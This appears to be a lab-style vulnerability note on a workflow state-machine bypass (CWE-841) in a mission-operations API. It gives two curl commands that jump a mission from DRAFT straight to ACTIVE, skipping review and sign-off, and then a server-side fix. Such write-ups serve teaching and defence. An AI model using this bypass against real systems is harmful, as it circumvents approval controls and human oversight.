Mission Operations — State Machine Bypass

CWE-841 · DRAFT→ACTIVE in one PATCH · Transition guard is frontend-only

Intended flow: DRAFT → SUBMITTED → APPROVED → ACTIVE → COMPLETED. The API accepts any state in the PATCH body with no prior-state check — an attacker jumps directly to ACTIVE, skipping peer review (SUBMITTED) and senior sign-off (APPROVED).
Attack (curl): 
# 1. Create a mission
curl -X POST http://localhost:5000/mission/ops \
     -H "Content-Type: application/json" -H "Cookie: session=<your-cookie>" \
     -d '{"name":"OP-SHADOW"}'

# 2. Bypass all approval steps in one call
curl -X PATCH http://localhost:5000/mission/ops/<id> \
     -H "Content-Type: application/json" -H "Cookie: session=<your-cookie>" \
     -d '{"state":"ACTIVE"}'
Remediation: Enforce valid transitions server-side: if new_state not in VALID_TRANSITIONS[current_state]: abort(400)
